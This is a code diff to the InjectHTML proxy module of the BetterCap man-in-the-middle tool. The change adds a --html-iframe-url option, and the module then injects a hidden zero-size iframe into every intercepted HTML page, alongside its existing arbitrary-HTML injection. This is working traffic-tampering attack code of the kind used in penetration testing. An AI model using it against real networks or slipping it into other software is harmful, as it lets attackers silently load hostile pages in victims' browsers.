@@ -12,6 +12,8 @@ This project is released under the GPL 3 license.
 
 # This proxy module will take care of HTML code injection.
 class InjectHTML < BetterCap::Proxy::Module
+  # URL of the iframe if --html-iframe-url was specified.
+  @@iframe = nil
   # HTML data to be injected.
   @@data = nil
 
@@ -24,12 +26,16 @@ class InjectHTML < BetterCap::Proxy::Module
     opts.on( '--html-data STRING', 'HTML code to be injected.' ) do |v|
       @@data = v
     end
+
+    opts.on( '--html-iframe-url URL', 'URL of the iframe that will be injected, if this option is specified an "iframe" tag will be injected.' ) do |v|
+      @@iframe = v
+    end
   end
 
   # Create an instance of this module and raise a BetterCap::Error if command
   # line arguments weren't correctly specified.
   def initialize
-    raise BetterCap::Error, "No --html-data option specified for the proxy module." if @@data.nil?
+    raise BetterCap::Error, "No --html-data option specified for the proxy module." if @@data.nil? and @@iframe.nil?
   end
 
   # Called by the BetterCap::Proxy::Proxy processor on each HTTP +request+ and
@@ -39,7 +45,11 @@ class InjectHTML < BetterCap::Proxy::Module
     if response.content_type =~ /^text\/html.*/
       BetterCap::Logger.info "Injecting HTML code into http://#{request.host}#{request.url}"
 
-      response.body.sub!( '</body>', "#{@@data}</body>" )
+      if @@data.nil?
+        response.body.sub!( '</body>', "<iframe src=\"#{@@iframe}\" frameborder=\"0\" height=\"0\" width=\"0\"></iframe></body>" )
+      else
+        response.body.sub!( '</body>', "#{@@data}</body>" )
+      end
     end
   end
 end
